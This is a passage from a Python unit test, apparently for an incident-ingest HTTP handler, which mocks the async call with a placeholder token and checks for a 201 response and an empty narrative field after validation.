        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # Narrative should be empty string after validation
                assert captured_data['incident']['narrative'] == ''
